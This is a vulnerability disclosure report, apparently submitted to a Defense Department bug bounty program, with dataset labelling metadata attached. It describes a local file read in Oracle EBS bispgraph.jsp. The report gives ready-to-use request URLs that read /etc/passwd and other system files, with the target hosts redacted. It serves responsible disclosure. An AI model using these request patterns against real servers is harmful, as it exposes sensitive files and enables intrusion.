title: Local File Read vulnerability on ██████████ [HtUS]
content:
Kindly check screenshot ███████: In case if scope question. Because i picked this site from DOD website list under 'dod sites'. Lets move on to the bug now :)
Summary:
Local File Include vulnerability on ███. Oracle Ebs Bispgrapgh is prone to a directory traversal vulnerability that can be exploited by remote attackers to access sensitive data on the server.
Steps To Reproduce:
[add details for how we can reproduce the issue]
to view /etc/passwd file visit https://██████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
to view /etc/motd file visit https://██████████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=motd&ifl=/etc/
to view /etc/profile visit https://██████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=profile&ifl=/etc/ ## Supporting Material/References: [list any additional material (e.g. screenshots, logs, etc.)]
█████:
█████:
https://web.cystack.net/vulnerability/cystack.remote.oracle_ebs_bispgrapgh_file_read
Impact
An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.
steps: Visit the URL: https://██████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/ to view the /etc/passwd file
Visit the URL: https://██████████/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=motd&ifl=/etc/ to view the /etc/motd file
vuln_description: Local File Include vulnerability in Oracle Ebs Bispgrapgh allows remote attackers to access sensitive data on the server via directory traversal.
reason: The vulnerability involves a straightforward directory traversal attack with no complex interactions or state manipulations required. The attack pattern is well-known and commonly found in similar applications.

authnz_metadata.reason: The vulnerability involves a local file read through directory traversal, which is not related to authentication or authorization boundaries within the same application. The methodology described focuses on swapping user sessions or resource IDs within the same application context, not on exploiting path traversal vulnerabilities.
